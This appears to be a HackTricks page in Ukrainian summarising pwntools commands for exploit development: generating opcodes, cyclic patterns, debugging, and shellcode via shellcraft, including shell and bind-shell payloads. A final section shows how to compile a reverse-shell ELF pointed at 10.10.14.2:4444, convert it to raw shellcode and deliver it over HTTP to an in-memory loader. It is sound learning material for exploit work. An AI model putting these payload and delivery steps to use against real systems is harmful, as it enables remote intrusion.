# PwnTools

{{#include ../../../banners/hacktricks-training.md}}
```
pip3 install pwntools
```
## Pwn asm

Отримати **opcodes** з рядка або файлу.
```
pwn asm "jmp esp"
pwn asm -i <filepath>
```
**Можна вибрати:**

- тип виводу (raw,hex,string,elf)
- контекст вихідного файлу (16,32,64,linux,windows...)
- уникати байтів (new lines, null, a list)
- вибрати encoder, debug shellcode, використовувати gdb для запуску output

## **Pwn checksec**

Скрипт checksec
```
pwn checksec <executable>
```
## Pwn constgrep

## Pwn cyclic

Отримати шаблон
```
pwn cyclic 3000
pwn cyclic -l faad
```
**Можна вибрати:**

- Використовуваний алфавіт (за замовчуванням — малі символи)
- Довжина унікального патерну (за замовчуванням 4)
- контекст (16,32,64,linux,windows...)
- Отримати зсув (-l)

## Pwn debug

Приєднати GDB до процесу
```
pwn debug --exec /bin/bash
pwn debug --pid 1234
pwn debug --process bash
```
**Можна вибрати:**

- За executable, за name або за pid context (16,32,64,linux,windows...)
- gdbscript для виконання
- sysrootpath

## Pwn disablenx

Вимкнути nx для binary
```
pwn disablenx <filepath>
```
## Pwn disasm

Disas hex opcodes
```
pwn disasm ffe4
```
**Можна вибрати:**

- context (16,32,64,linux,windows...)
- base address
- color(default)/no color

## Pwn elfdiff

Показує відмінності між 2 файлами
```
pwn elfdiff <file1> <file2>
```
## Pwn hex

Отримати шістнадцяткове представлення
```bash
pwn hex hola #Get hex of "hola" ascii
```
## Pwn phd

Отримати hexdump
```
pwn phd <file>
```
**Можна вибрати:**

- Кількість bytes для відображення
- Кількість bytes на рядок (highlight byte)
- Пропустити bytes на початку

## Pwn pwnstrip

## Pwn scrable

## Pwn shellcraft

Отримати shellcodes
```
pwn shellcraft -l #List shellcodes
pwn shellcraft -l amd #Shellcode with amd in the name
pwn shellcraft -f hex amd64.linux.sh #Create in C and run
pwn shellcraft -r amd64.linux.sh #Run to test. Get shell
pwn shellcraft .r amd64.linux.bindsh 9095 #Bind SH to port
```
**Можна вибрати:**

- shellcode та аргументи для нього
- Вихідний файл
- формат виводу
- debug (підключити dbg до shellcode)
- перед (debug trap перед кодом)
- після
- уникати використання opcodes (за замовчуванням: not null and new line)
- Запустити shellcode
- Колір/без кольору
- список syscalls
- список можливих shellcodes
- Генерувати ELF як shared library

## Pwn шаблон

Отримати python шаблон
```
pwn template
```
**Можна вибрати:** host, port, user, pass, path and quiet

## Pwn unhex

З hex у string
```
pwn unhex 686f6c61
```
## Pwn update

Щоб оновити pwntools
```
pwn update
```
## ELF → raw shellcode пакування (loader_append)

Pwntools може перетворити автономний ELF у єдиний raw shellcode blob, який самостійно відображає свої сегменти і передає виконання до оригінального entrypoint. Це ідеально для memory‑only loaders (наприклад, Android apps, що викликають JNI для виконання завантажених байтів).

Typical pipeline (amd64 example)

1) Зібрати static, position‑independent payload ELF (рекомендується musl для портативності):
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
-DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
2) Перетворити ELF → shellcode за допомогою pwntools:
```python
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
sc = asm(shellcraft.loader_append(elf.data, arch='amd64'))
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)} bytes, shellcode size={len(sc)} bytes")
```
3) Доставте sc до memory loader (наприклад, через HTTP[S]) та виконайте in‑process.

Примітки
- loader_append вбудовує оригінальну програму ELF у shellcode і генерує невеликий loader, який mmaps сегменти і переходить до entry.
- Явно вказуйте архітектуру через context.clear(arch=...). arm64 часто зустрічається на Android.
- Зробіть код payload’а позиційно-незалежним і не робіть припущень щодо ASLR/NX процесу.

## Посилання

- [Pwntools](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode pipeline used for Android in-memory execution](https://github.com/0xdevil/corphone)

{{#include ../../../banners/hacktricks-training.md}}
